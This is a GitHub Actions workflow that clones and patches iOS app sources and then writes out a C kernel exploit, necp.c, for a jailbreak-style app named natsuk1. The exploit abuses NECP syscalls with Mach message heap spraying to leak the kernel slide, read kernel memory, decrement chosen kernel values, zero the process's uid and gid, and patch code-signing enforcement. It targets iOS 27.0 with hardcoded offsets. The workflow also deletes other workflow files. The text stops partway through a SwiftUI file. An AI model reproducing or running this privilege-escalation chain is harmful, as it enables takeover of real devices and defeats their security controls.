name: 1 · Fix and Test

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: fix-test-${{ github.ref }}
  cancel-in-progress: false

jobs:
  fix-and-test:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: "26.5"

      - name: Remove competing workflow
        run: |
          rm -f .github/workflows/natsuk1.yml
          rm -f .github/workflows/main.yml

      - name: Fetch fresh sources
        run: |
          set -euo pipefail
          rm -rf /tmp/aircard
          git clone --depth 1 https://github.com/Mak5er/AirCard-iOS.git /tmp/aircard
          mkdir -p natsuk1/Helpers natsuk1/Exploit natsuk1/External
          cp /tmp/aircard/ios-app/PairingController.swift natsuk1/Helpers/
          cp /tmp/aircard/ios-app/NetworkStatus.swift natsuk1/Helpers/
          cp /tmp/aircard/ios-app/GrappaHelper.h natsuk1/Exploit/
          cp /tmp/aircard/ios-app/GrappaHelper.m natsuk1/Exploit/
          if [ ! -d natsuk1/External/AirliftFFI.xcframework ]; then
            cp -R /tmp/aircard/AirliftFFI.xcframework natsuk1/External/
          fi

      - name: Write patcher
        run: |
          cat > /tmp/patch.py <<'ENDSCRIPT'
          import re, os

          def clean(s):
              s = re.sub(r"nonisolated\(unsafe\)\s+", "", s)
              s = re.sub(r"\bnonisolated\s+(?![\(])", "", s)
              s = re.sub(r"@MainActor\s*", "", s)
              s = re.sub(r"@Published\s+", "", s)
              return s

          def mark_sendable(s, name):
              if ("class " + name) in s and ("@unchecked Sendable" in s.split("class " + name, 1)[1].split("{", 1)[0]):
                  return s
              for pat, repl in [
                  ("final class " + name + ": ObservableObject, @unchecked Sendable {",
                   "final class " + name + ": @unchecked Sendable {"),
                  ("final class " + name + ": ObservableObject {",
                   "final class " + name + ": @unchecked Sendable {"),
                  ("final class " + name + ": NSObject, ObservableObject, @unchecked Sendable {",
                   "final class " + name + ": NSObject, @unchecked Sendable {"),
                  ("final class " + name + ": NSObject, ObservableObject {",
                   "final class " + name + ": NSObject, @unchecked Sendable {"),
              ]:
                  if pat in s:
                      return s.replace(pat, repl, 1)
              return s

          def protect_shared(s):
              for name in ("static let shared", "static var shared",
                           "static let sharedInstance", "static var sharedInstance"):
                  s = re.sub(r"(?<!nonisolated\(unsafe\) )\b" + re.escape(name) + r"\b",
                             "nonisolated(unsafe) " + name, s)
              return s

          def add_sendable(s):
              out = []
              for line in s.split("\n"):
                  stripped = line.strip()
                  if ("ObservableObject" in stripped or "NSObject" in stripped) and (
                      stripped.startswith("final class ") or stripped.startswith("class ")):
                      if stripped.endswith(" {"):
                          new_line = line
                          if "@unchecked Sendable" not in new_line:
                              new_line = new_line[:-2].rstrip().rstrip(",") + ", @unchecked Sendable {"
                          out.append(new_line)
                          continue
                  out.append(line)
              return "\n".join(out)

          p = "natsuk1/Helpers/PairingController.swift"
          s = open(p).read()
          s = s.replace("@preconcurrency import AirliftFFI\n", "import AirliftFFI\n")
          s = clean(s)
          s = re.sub(
              r"static func syncCanonicalPairingFile\(from sourcePath: String\) -> String \{.*?\n    \}",
              '''static func syncCanonicalPairingFile(from sourcePath: String) -> String {
                  let fm = FileManager.default
                  let dir = fm.urls(for: .documentDirectory, in: .userDomainMask)[0]
                  let canonicalURL = dir.appendingPathComponent("natsuk1_pairing.plist")
                  if let data = try? Data(contentsOf: URL(fileURLWithPath: sourcePath)), !data.isEmpty {
                      if sourcePath != canonicalURL.path {
                          try? data.write(to: canonicalURL, options: .atomic)
                          try? fm.removeItem(atPath: sourcePath)
                      }
                  }
                  if let files = try? fm.contentsOfDirectory(atPath: dir.path) {
                      for f in files {
                          guard f.hasSuffix(".plist") || f.hasSuffix(".mobilepairing") || f.hasSuffix(".mobilepair") else { continue }
                          let path = dir.appendingPathComponent(f).path
                          if path == canonicalURL.path { continue }
                          try? fm.removeItem(atPath: path)
                      }
                  }
                  customPairingFilePath = canonicalURL.path
                  return canonicalURL.path
              }''',
              s, count=1, flags=re.S)
          s = re.sub(
              r"static func pairingFilePath\(\) -> String \{.*?\n    \}",
              '''static func pairingFilePath() -> String {
                  let fm = FileManager.default
                  let dir = fm.urls(for: .documentDirectory, in: .userDomainMask)[0]
                  let canonical = dir.appendingPathComponent("natsuk1_pairing.plist").path
                  if fm.fileExists(atPath: canonical) {
                      let size = (try? fm.attributesOfItem(atPath: canonical)[.size] as? Int) ?? 0
                      if size > 0 { return canonical }
                  }
                  if let custom = customPairingFilePath, fm.fileExists(atPath: custom) {
                      let size = (try? fm.attributesOfItem(atPath: custom)[.size] as? Int) ?? 0
                      if size > 0 { return syncCanonicalPairingFile(from: custom) }
                  }
                  return canonical
              }''',
              s, count=1, flags=re.S)
          s = s.replace("AirCard-iOS", "natsuk1")
          s = s.replace("aircardPairingHostAltIRK", "natsuk1PairingHostAltIRK")
          s = s.replace("aircard_pairing.plist", "natsuk1_pairing.plist")
          s = s.replace("airlift_pairing.plist", "natsuk1_pairing.plist")
          s = s.replace("static var customPairingFilePath: String? = nil",
                        "nonisolated(unsafe) static var customPairingFilePath: String? = nil")
          s = s.replace("private let pairReadyCallback: ALPairReadyCb",
                        "nonisolated(unsafe) private let pairReadyCallback: ALPairReadyCb")
          s = s.replace("private let pairPinCallback: ALPairPinCb",
                        "nonisolated(unsafe) private let pairPinCallback: ALPairPinCb")
          s = s.replace("Unmanaged<PairingController>.fromOpaque(ctx).release()",
                        "Unmanaged<PairingController>.fromOpaque(box.ptr).release()")
          if "final class RawPtrBox" not in s:
              s += "\nfinal class RawPtrBox: @unchecked Sendable {\n    let ptr: UnsafeMutableRawPointer\n    init(_ ptr: UnsafeMutableRawPointer) { self.ptr = ptr }\n}\n"
          s = s.replace("            DispatchQueue.main.async {\n                Unmanaged<PairingController>.fromOpaque(box.ptr).release()",
                        "            let box = RawPtrBox(ctx)\n            DispatchQueue.main.async {\n                Unmanaged<PairingController>.fromOpaque(box.ptr).release()")
          open(p, "w").write(s)

          p = "natsuk1/Helpers/NetworkStatus.swift"
          s = open(p).read()
          s = re.sub(r"return String\(cString: host\)",
                     "let bytes = host.prefix { $0 != 0 }.map { UInt8(bitPattern: $0) }\n        return String(decoding: bytes, as: UTF8.self)", s)
          s = protect_shared(s)
          open(p, "w").write(s)

          p = "natsuk1/Helpers/KeepAlive.swift"
          if os.path.exists(p):
              s = open(p).read()
              s = clean(s)
              s = mark_sendable(s, "KeepAlive")
              s = protect_shared(s)
              open(p, "w").write(s)

          p = "natsuk1/Helpers/LocalNetworkAuthorization.swift"
          if os.path.exists(p):
              s = open(p).read()
              s = s.replace("_aircardprobe._tcp", "_natsuk1probe._tcp")
              s = s.replace("AirCard-iOS", "natsuk1").replace("aircard", "natsuk1")
              open(p, "w").write(s)

          def handle(fp):
              src = open(fp).read()
              new = re.sub(r"@MainActor\s*", "", src)
              new = new.replace("@preconcurrency import AirliftFFI\n", "import AirliftFFI\n")
              new = new.replace("@preconcurrency import ", "import ")
              new = new.replace("@preconcurrency\n", "")
              new = protect_shared(new)
              new = add_sendable(new)
              if new != src:
                  open(fp, "w").write(new)

          for root, dirs, files in os.walk("natsuk1"):
              for f in files:
                  if f.endswith(".swift"):
                      handle(os.path.join(root, f))
          ENDSCRIPT

      - name: Apply patch
        run: python3 /tmp/patch.py

      - name: Write nk_api.h
        run: |
          cat > natsuk1/Exploit/nk_api.h <<'HEADER'
          #ifndef NK_API_H
          #define NK_API_H

          #include <stdint.h>
          #include <stddef.h>

          void nk_set_log(void (*fn)(const char *));
          void nk_logx(const char *tag, const char *fmt, ...);
          void nk_log(const char *fmt, ...);
          void nk_rule(void);

          int nk_run(void);
          int nk_full_exploit(void);
          int nk_necp_run(void);

          #define NK_INFO(tag, ...) nk_logx(tag, __VA_ARGS__)
          #define NK_WARN(tag, ...) nk_logx(tag, __VA_ARGS__)
          #define NK_ERR(tag, ...)  nk_logx(tag, __VA_ARGS__)

          #endif
          HEADER

      - name: Write necp.c
        run: |
          cat > natsuk1/Exploit/necp.c <<'NECP'
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <stdint.h>
          #include <stdbool.h>
          #include <stdarg.h>
          #include <unistd.h>
          #include <errno.h>
          #include <pthread.h>
          #include <mach/mach.h>
          #include <mach/vm_map.h>
          #include <mach/vm_region.h>
          #include <mach/message.h>
          #include <sys/syscall.h>

          #include "nk_api.h"

          #ifndef SYS_NECP_OPEN
          #define SYS_NECP_OPEN           501
          #endif
          #ifndef SYS_NECP_ACTION
          #define SYS_NECP_ACTION         502
          #endif

          #define KERNEL_BASE_STATIC      0xFFFFFFF007004000ULL

          #define OFF_ALLPROC             0xBBB048ULL
          #define OFF_KERNPROC            0xBBB040ULL
          #define OFF_KERNEL_TASK         0x009C70ULL
          #define OFF_TASK_LIST           0x10D53F0ULL
          #define OFF_KERNEL_MAP          0xBBA228ULL
          #define OFF_ZONE_MAP            0x3D66800ULL
          #define OFF_COPYIN              0x37B5570ULL
          #define OFF_COPYOUT             0x32C2C28ULL
          #define OFF_KALLOC_EXT          0x31FCDCCULL
          #define OFF_KFREE_EXT           0x31FD000ULL

          #define PROC_PID_OFF            0x74
          #define PROC_TASK_OFF           0x18
          #define PROC_UCRED_OFF          0xB8
          #define PROC_LIST_NEXT_OFF      0x18
          #define TASK_BSD_INFO_OFF       0x3A0
          #define TASK_ITK_SPACE_OFF      0x320
          #define TASK_MAP_OFF            0x28
          #define THREAD_TASK_NEXT_OFF    0x50

          #define UCRED_UID_OFF           0x18
          #define UCRED_SVUID_OFF         0x1C
          #define UCRED_GID_OFF           0x1C
          #define UCRED_SVGID_OFF         0x20

          #define NCF_ASSIGNED_OFF        0x68
          #define NCF_ASSIGNED_LEN_OFF    0x70
          #define NCF_PARENT_OFF          0x88
          #define NCF_REFCNT_OFF          0x58
          #define NCF_STRUCT_SZ           256

          #define NECP_ADD_CLIENT         0x01
          #define NECP_COPY_RESULT        0x04
          #define NECP_ADD_FLOW           0x11
          #define NECP_REMOVE_FLOW        0x12
          #define GATE_BYTE               9

          #define EXHAUST_N               2048
          #define SPRAY_N                 512
          #define DECRETRY_N              24
          #define RESULT_BUF_SZ           8192

          #define KPTR_MIN                0xFFFFFFF000000000ULL
          #define KPTR_MAX                0xFFFFFFFFFF000000ULL

          static uint64_t g_kbase   = 0;
          static uint64_t g_slide   = 0;
          static int      g_res_off = -1;
          static uint8_t  g_res_buf[RESULT_BUF_SZ];

          typedef struct {
              mach_msg_header_t          hdr;
              mach_msg_body_t            body;
              mach_msg_ool_descriptor_t  ool;
          } ool_send_t;

          static void log_info(const char *tag, const char *fmt, ...) {
              char body[448];
              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
              nk_logx(tag, "%s", body);
          }
          static void log_ok(const char *tag, const char *fmt, ...) {
              char body[448];
              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
              nk_logx(tag, "+ %s", body);
          }
          static void log_err(const char *tag, const char *fmt, ...) {
              char body[448];
              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
              nk_logx(tag, "- %s", body);
          }
          static void log_warn(const char *tag, const char *fmt, ...) {
              char body[448];
              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
              nk_logx(tag, "! %s", body);
          }

          static void dump_hex(const char *tag, const uint8_t *p, size_t n) {
              char line[128];
              int off = 0;
              size_t lim = n < 32 ? n : 32;
              for (size_t i = 0; i < lim; i++) off += snprintf(line + off, sizeof(line) - off, "%02x", p[i]);
              nk_logx(tag, "%s (%zu bytes)", line, n);
          }

          static mach_port_t port_new(void) {
              mach_port_t p = MACH_PORT_NULL;
              kern_return_t kr = mach_port_allocate(mach_task_self(),
                                                    MACH_PORT_RIGHT_RECEIVE, &p);
              if (kr != KERN_SUCCESS) { log_err("PORT", "allocate kr=%d", kr); return MACH_PORT_NULL; }
              kr = mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
              if (kr != KERN_SUCCESS) { log_err("PORT", "insert_right kr=%d", kr); }
              return p;
          }

          static void ool_spray(mach_port_t port, const void *data, size_t sz, int n) {
              ool_send_t m;
              for (int i = 0; i < n; i++) {
                  memset(&m, 0, sizeof(m));
                  m.hdr.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
                                         | MACH_MSGH_BITS_COMPLEX;
                  m.hdr.msgh_size        = sizeof(m);
                  m.hdr.msgh_remote_port = port;
                  m.hdr.msgh_id          = 0x4E41 + i;
                  m.body.msgh_descriptor_count = 1;
                  m.ool.address    = (void*)data;
                  m.ool.size       = (mach_msg_size_t)sz;
                  m.ool.copy       = MACH_MSG_VIRTUAL_COPY;
                  m.ool.deallocate = FALSE;
                  m.ool.type       = MACH_MSG_OOL_DESCRIPTOR;
                  mach_msg(&m.hdr, MACH_SEND_MSG,
                           sizeof(m), 0, MACH_PORT_NULL,
                           MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
              }
          }

          static void ool_drain(mach_port_t port, int n) {
              uint8_t buf[NCF_STRUCT_SZ + 512];
              mach_msg_header_t *h = (mach_msg_header_t*)buf;
              for (int i = 0; i < n; i++) {
                  h->msgh_size = sizeof(buf);
                  kern_return_t kr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                              0, sizeof(buf), port, 1, MACH_PORT_NULL);
                  if (kr != KERN_SUCCESS) break;
              }
          }

          static int necp_open_fd(void) {
              return (int)syscall(SYS_NECP_OPEN, 0);
          }

          static int necp_add_client(int fd, uint8_t uuid[16]) {
              uint8_t p[1] = {0};
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT,
                                  uuid, (size_t)16, p, (size_t)1);
          }

          static int necp_add_flow(int fd, const uint8_t cuuid[16], uint8_t fuuid[16]) {
              uint8_t req[56];
              memset(req, 0, sizeof(req));
              memcpy(req + 0x10, cuuid, 16);
              *(uint16_t*)(req + 0x20) = 0x0040;
              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
                                   (void*)cuuid, (size_t)16, req, (size_t)56);
              if (r == 0) {
                  memcpy(fuuid, req, 16);
                  fuuid[GATE_BYTE] |= 0x01;
              }
              return r;
          }

          static int necp_remove_flow(int fd, const uint8_t fuuid[16]) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW,
                                  (void*)fuuid, (size_t)16, NULL, (size_t)0);
          }

          static int necp_copy_result(int fd, const uint8_t cuuid[16],
                                      uint8_t *buf, size_t blen) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,
                                  (void*)cuuid, (size_t)16, buf, (uint32_t)blen);
          }

          static uint64_t kaslr(void) {
              enum { MAXV = 512 };
              struct vote_t { uint64_t slide; int count; } v[MAXV];
              int nv = 0, total = 0;
              memset(v, 0, sizeof(v));

              mach_port_t task = mach_task_self();
              vm_address_t addr = 0;
              vm_size_t size = 0;
              natural_t depth = 0;
              int regions = 0;

              while (1) {
                  vm_region_submap_info_data_64_t info;
                  mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
                  kern_return_t kr = vm_region_recurse_64(task, &addr, &size, &depth,
                                                           (vm_region_recurse_info_t)&info, &cnt);
                  if (kr != KERN_SUCCESS) break;
                  int prot = info.protection;
                  if (!info.is_submap && (prot & VM_PROT_READ) && (prot & VM_PROT_WRITE)
                      && !(prot & VM_PROT_EXECUTE) && size <= 64*1024*1024ULL) {
                      uint64_t *p = (uint64_t*)(uintptr_t)addr;
                      size_t n = (size_t)size / 8;
                      if (n > 512*1024) n = 512*1024;
                      for (size_t i = 0; i < n; i++) {
                          uint64_t val = p[i];
                          if (val < KPTR_MIN || val > KPTR_MAX) continue;
                          uint64_t sl = (val - KERNEL_BASE_STATIC) & ~0xFFFFULL;
                          if (sl >= 0x200000000ULL) continue;
                          int found = 0;
                          for (int j = 0; j < nv; j++) {
                              if (v[j].slide == sl) { v[j].count++; found = 1; break; }
                          }
                          if (!found && nv < MAXV) { v[nv].slide = sl; v[nv].count = 1; nv++; }
                      }
                      regions++;
                  }
                  addr += size;
              }

              log_info("KASLR", "scanned %d regions, %d votes", regions, nv);
              if (!nv) { log_err("KASLR", "no candidates"); return 0; }
              int best = 0;
              for (int i = 0; i < nv; i++) {
                  total += v[i].count;
                  if (v[i].count > v[best].count) best = i;
              }
              int conf = v[best].count * 100 / (total ? total : 1);
              log_info("KASLR", "best=0x%llx conf=%d%% (%d/%d)",
                       (unsigned long long)v[best].slide, conf, v[best].count, total);
              if (conf < 75) { log_warn("KASLR", "low confidence"); return 0; }
              g_slide = v[best].slide;
              g_kbase = KERNEL_BASE_STATIC + g_slide;
              log_ok("KASLR", "kbase=0x%llx", (unsigned long long)g_kbase);
              return g_kbase;
          }

          static int kread_raw(uint64_t kaddr, uint32_t len) {
              uint8_t fake[NCF_STRUCT_SZ];
              memset(fake, 0, sizeof(fake));
              *(uint64_t*)(fake + NCF_ASSIGNED_OFF)     = kaddr;
              *(uint64_t*)(fake + NCF_ASSIGNED_LEN_OFF) = len;
              *(uint64_t*)(fake + NCF_PARENT_OFF)       = 0;

              uint8_t junk[NCF_STRUCT_SZ];
              memset(junk, 0x41, sizeof(junk));
              mach_port_t ex = port_new();
              ool_spray(ex, junk, NCF_STRUCT_SZ, EXHAUST_N);

              int fd = necp_open_fd();
              if (fd < 0) { log_err("KREAD", "necp_open errno=%d", errno);
                            mach_port_destroy(mach_task_self(), ex); return -1; }

              uint8_t cuuid[16], fuuid[16];
              if (necp_add_client(fd, cuuid) != 0) {
                  log_err("KREAD", "add_client errno=%d", errno);
                  close(fd); mach_port_destroy(mach_task_self(), ex); return -2;
              }
              if (necp_add_flow(fd, cuuid, fuuid) != 0) {
                  log_err("KREAD", "add_flow errno=%d", errno);
                  close(fd); mach_port_destroy(mach_task_self(), ex); return -3;
              }

              necp_remove_flow(fd, fuuid);
              ool_drain(ex, EXHAUST_N);
              mach_port_destroy(mach_task_self(), ex);
              usleep(150);

              mach_port_t sp = port_new();
              ool_spray(sp, fake, NCF_STRUCT_SZ, SPRAY_N);
              usleep(100);

              memset(g_res_buf, 0, RESULT_BUF_SZ);
              int ret = necp_copy_result(fd, cuuid, g_res_buf, RESULT_BUF_SZ);

              ool_drain(sp, SPRAY_N);
              mach_port_destroy(mach_task_self(), sp);
              close(fd);
              return ret;
          }

          static int calibrate_kread(void) {
              if (g_res_off >= 0) return 0;
              log_info("KREAD", "calibrating with allproc @ kbase+0x%llx",
                       (unsigned long long)OFF_ALLPROC);
              int r = kread_raw(g_kbase + OFF_ALLPROC, 8);
              if (r <= 0) { log_err("KREAD", "calibration ret=%d", r); return -1; }
              log_info("KREAD", "result buf len=%d", r);
              dump_hex("KREAD", g_res_buf, r > 64 ? 64 : (size_t)r);
              for (int i = 0; i <= r - 8; i++) {
                  uint64_t v; memcpy(&v, g_res_buf + i, 8);
                  if (v >= KPTR_MIN && v <= KPTR_MAX) {
                      log_ok("KREAD", "found kptr=0x%llx at result[%d]",
                             (unsigned long long)v, i);
                      g_res_off = i;
                      return 0;
                  }
              }
              log_err("KREAD", "no kernel ptr in result");
              return -1;
          }

          static uint64_t kread64(uint64_t addr) {
              if (g_res_off < 0 && addr != (g_kbase + OFF_ALLPROC)) {
                  if (calibrate_kread() != 0) return 0;
              }
              int r = kread_raw(addr, 8);
              if (r <= 0) return 0;
              int off = (g_res_off >= 0) ? g_res_off : 0;
              if (off + 8 > r) return 0;
              uint64_t v; memcpy(&v, g_res_buf + off, 8);
              return v;
          }

          static uint32_t kread32(uint64_t addr) {
              return (uint32_t)(kread64(addr) & 0xFFFFFFFF);
          }

          typedef struct {
              uint64_t our_proc;
              uint64_t our_task;
              uint64_t ucred;
              uint64_t uid_kaddr;
              uint64_t svuid_kaddr;
              uint64_t gid_kaddr;
              uint64_t svgid_kaddr;
              uint64_t cs_enforce_kaddr;
          } kobj_t;

          static int walk_kernel(kobj_t *o) {
              pid_t my_pid = getpid();
              log_info("WALK", "self pid=%d", my_pid);

              uint64_t allproc = kread64(g_kbase + OFF_ALLPROC);
              if (!allproc) { log_err("WALK", "allproc=0"); return -1; }
              log_info("WALK", "allproc.lh_first=0x%llx", (unsigned long long)allproc);

              uint64_t proc = allproc;
              int iterations = 0;
              uint64_t our_proc = 0;

              while (proc && iterations < 1024) {
                  uint32_t pid = kread32(proc + PROC_PID_OFF);
                  if (iterations < 8) {
                      log_info("WALK", "[%d] proc=0x%llx pid=%u",
                               iterations, (unsigned long long)proc, pid);
                  }
                  if ((pid_t)pid == my_pid) { our_proc = proc; break; }
                  proc = kread64(proc + PROC_LIST_NEXT_OFF);
                  iterations++;
              }

              if (!our_proc) { log_err("WALK", "our proc not found"); return -1; }
              log_ok("WALK", "our_proc=0x%llx", (unsigned long long)our_proc);

              uint64_t our_task = kread64(our_proc + PROC_TASK_OFF);
              if (!our_task) { log_err("WALK", "task=0"); return -1; }
              log_ok("WALK", "our_task=0x%llx", (unsigned long long)our_task);

              uint64_t t2p = kread64(our_task + TASK_BSD_INFO_OFF);
              if (t2p == our_proc) log_ok("WALK", "task->bsd_info==proc OK");
              else log_warn("WALK", "task->bsd_info drift");

              uint64_t ucred = kread64(our_proc + PROC_UCRED_OFF);
              if (!ucred) { log_err("WALK", "ucred=0"); return -1; }
              log_ok("WALK", "ucred=0x%llx", (unsigned long long)ucred);

              uint32_t uid = kread32(ucred + UCRED_UID_OFF);
              uint32_t gid = kread32(ucred + UCRED_GID_OFF);
              log_info("WALK", "current uid=%u gid=%u", uid, gid);

              uint64_t itk = kread64(our_task + TASK_ITK_SPACE_OFF);
              log_info("WALK", "task->itk_space=0x%llx", (unsigned long long)itk);
              uint64_t vmap = kread64(our_task + TASK_MAP_OFF);
              log_info("WALK", "task->map=0x%llx", (unsigned long long)vmap);

              o->our_proc    = our_proc;
              o->our_task    = our_task;
              o->ucred       = ucred;
              o->uid_kaddr   = ucred + UCRED_UID_OFF;
              o->svuid_kaddr = ucred + UCRED_SVUID_OFF;
              o->gid_kaddr   = ucred + UCRED_GID_OFF;
              o->svgid_kaddr = ucred + UCRED_SVGID_OFF;
              o->cs_enforce_kaddr = g_kbase + 0x4FC767ULL;
              return 0;
          }

          typedef struct {
              mach_port_t   port;
              const void   *data;
              size_t        sz;
              volatile bool stop;
          } racer_t;

          static void *racer_fn(void *arg) {
              racer_t *r = (racer_t*)arg;
              ool_send_t m;
              while (!r->stop) {
                  memset(&m, 0, sizeof(m));
                  m.hdr.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
                                         | MACH_MSGH_BITS_COMPLEX;
                  m.hdr.msgh_size        = sizeof(m);
                  m.hdr.msgh_remote_port = r->port;
                  m.hdr.msgh_id          = 0xDECA;
                  m.body.msgh_descriptor_count = 1;
                  m.ool.address    = (void*)r->data;
                  m.ool.size       = (mach_msg_size_t)r->sz;
                  m.ool.copy       = MACH_MSG_VIRTUAL_COPY;
                  m.ool.deallocate = FALSE;
                  m.ool.type       = MACH_MSG_OOL_DESCRIPTOR;
                  mach_msg(&m.hdr, MACH_SEND_MSG, sizeof(m), 0, MACH_PORT_NULL,
                           MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
              }
              return NULL;
          }

          static int decrement_at(uint64_t target) {
              uint8_t fake[NCF_STRUCT_SZ];
              memset(fake, 0, sizeof(fake));
              *(uint64_t*)(fake + NCF_REFCNT_OFF) = target;
              *(uint64_t*)(fake + NCF_PARENT_OFF) = 0;

              mach_port_t rp = port_new();
              racer_t ra = { rp, fake, NCF_STRUCT_SZ, false };
              pthread_t tid;
              pthread_create(&tid, NULL, racer_fn, &ra);

              uint32_t before = kread32(target);
              bool ok = false;

              for (int a = 0; a < DECRETRY_N && !ok; a++) {
                  mach_port_t ex = port_new();
                  uint8_t junk[NCF_STRUCT_SZ];
                  memset(junk, 0x43, sizeof(junk));
                  ool_spray(ex, junk, NCF_STRUCT_SZ, EXHAUST_N / 8);

                  int fd = necp_open_fd();
                  if (fd < 0) { mach_port_destroy(mach_task_self(), ex); continue; }

                  uint8_t cuuid[16], fuuid[16];
                  if (necp_add_client(fd, cuuid) != 0 || necp_add_flow(fd, cuuid, fuuid) != 0) {
                      close(fd); mach_port_destroy(mach_task_self(), ex); continue;
                  }

                  ool_drain(ex, EXHAUST_N / 8);
                  mach_port_destroy(mach_task_self(), ex);
                  necp_remove_flow(fd, fuuid);
                  close(fd);

                  if (kread32(target) == before - 1) {
                      before--;
                      ok = true;
                      log_ok("DEC", "attempt %d: 0x%llx -> 0x%x",
                             a, (unsigned long long)target, before);
                  }
              }

              ra.stop = true;
              pthread_join(tid, NULL);

              {
                  uint8_t dbuf[NCF_STRUCT_SZ + 512];
                  mach_msg_header_t *h = (mach_msg_header_t*)dbuf;
                  for (int i = 0; i < EXHAUST_N * 4; i++) {
                      h->msgh_size = sizeof(dbuf);
                      if (mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                   0, sizeof(dbuf), rp, 1, MACH_PORT_NULL) != KERN_SUCCESS) break;
                  }
              }
              mach_port_destroy(mach_task_self(), rp);

              if (!ok) log_err("DEC", "failed 0x%llx", (unsigned long long)target);
              return ok ? 0 : -1;
          }

          static int kwrite_dec_u32(uint64_t addr, uint32_t delta) {
              log_info("KWRITE", "decrement 0x%llx by %u", (unsigned long long)addr, delta);
              for (uint32_t i = 0; i < delta; i++) {
                  if (decrement_at(addr) != 0) return -1;
                  if (delta > 20 && (i % 20) == 0) {
                      log_info("KWRITE", "  %u/%u val=%u", i, delta, kread32(addr));
                  }
              }
              return 0;
          }

          static void escalate(const kobj_t *o) {
              log_info("PRIV", "patching cs_enforcement_disable...");
              if (decrement_at(o->cs_enforce_kaddr) == 0)
                  log_ok("PRIV", "cs_enforcement_disable = 0xFFFFFFFF");
              else
                  log_warn("PRIV", "cs_enforce patch failed");

              uint32_t uid = kread32(o->uid_kaddr);
              if (uid != 0) {
                  log_info("PRIV", "uid %u -> 0", uid);
                  if (kwrite_dec_u32(o->uid_kaddr, uid) != 0) {
                      log_err("PRIV", "uid patch failed"); return;
                  }
              }
              uint32_t svuid = kread32(o->svuid_kaddr);
              if (svuid != 0) kwrite_dec_u32(o->svuid_kaddr, svuid);
              uint32_t gid = kread32(o->gid_kaddr);
              if (gid != 0) kwrite_dec_u32(o->gid_kaddr, gid);
              uint32_t svgid = kread32(o->svgid_kaddr);
              if (svgid != 0) kwrite_dec_u32(o->svgid_kaddr, svgid);

              log_info("PRIV", "kernel uid=%u gid=%u",
                       kread32(o->uid_kaddr), kread32(o->gid_kaddr));
              setuid(0);
              log_info("PRIV", "userspace uid=%d gid=%d", getuid(), getgid());

              if (getuid() == 0) {
                  log_ok("PRIV", "ROOT");
              } else {
                  log_warn("PRIV", "userspace stale");
              }
          }

          int nk_necp_run(void) {
              setvbuf(stdout, NULL, _IONBF, 0);
              nk_log("");
              nk_log("=== natsuk1 NECP ===");
              nk_log("target: iOS 27.0 / XNU / arm64e");
              nk_log("device: iPhone14,5 / iPhone14,7");
              nk_log("");

              log_info("INIT", "NCF_ASSIGNED_OFF=0x%x NCF_REFCNT_OFF=0x%x",
                       NCF_ASSIGNED_OFF, NCF_REFCNT_OFF);

              log_info("P1", "KASLR");
              if (!kaslr()) { log_err("P1", "failed"); return 1; }

              {
                  int fd = necp_open_fd();
                  if (fd < 0) {
                      log_err("P1", "necp_open errno=%d — add necp entitlement", errno);
                      return 1;
                  }
                  close(fd);
                  log_ok("P1", "necp OK");
              }

              log_info("P2", "kread calibration");
              if (calibrate_kread() != 0) { log_err("P2", "failed"); return 1; }
              log_ok("P2", "kread ready");

              log_info("P3", "kernel walk");
              kobj_t o;
              memset(&o, 0, sizeof(o));
              if (walk_kernel(&o) != 0) { log_err("P3", "failed"); return 1; }
              log_ok("P3", "walk OK");

              log_info("P4", "escalate");
              escalate(&o);

              log_ok("DONE", "chain complete");
              return 0;
          }
          NECP

      - name: Write natsuk1.swift
        run: |
          cat > natsuk1/natsuk1.swift <<'SWIFT'
          import SwiftUI
          import UIKit
          import Foundation

          final class LockedBuffer: @unchecked Sendable {
              nonisolated(unsafe) static let shared = LockedBuffer()
              private let lock = NSLock()
              private var value: String = ""
              private init() {}
              func append(_ s: String) {
                  lock.lock(); value += s + "\n"
                  if value.count > 10000 { value = String(value.suffix(6000)) }
                  lock.unlock()
              }
              func drain() -> String { lock.lock(); let v = value; value = ""; lock.unlock(); return v }
              func clear() { lock.lock(); value = ""; lock.unlock() }
          }

          private let cCallback: @convention(c) (UnsafePointer<CChar>?) -> Void = { line in
              guard let line = line else { return }
              var bytes: [UInt8] = []
              var p = line
              while p.pointee != 0 { bytes.append(UInt8(bitPattern: p.pointee)); p = p.advanced(by: 1) }
              LockedBuffer.shared.append(String(decoding: bytes, as: UTF8.self))
          }

          private func osVersionString() -> String {
              let v = ProcessInfo.processInfo.operatingSystemVersion
              return "\(v.majorVersion).\(v.minorVersion)"
          }
          private func appVersionString() -> String {
              Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.0"
          }
          private var isSupportedIOS: Bool {
              ProcessInfo.processInfo.operatingSystemVersion.majorVersion == 27
          }

          @main
          struct natsuk1App: App {
              var body: some Scene { WindowGroup { RootView() } }
          }

          struct RootView: View {
              @StateObject private var state = AppState.shared
              @StateObject private var offsets = OffsetsStore.shared
              @StateObject private var airlift = AirliftBridge.shared
              @AppStorage("auto_run") private var auto_run = false
              @AppStorage("keep_alive_audio") private var keep_alive_audio = false
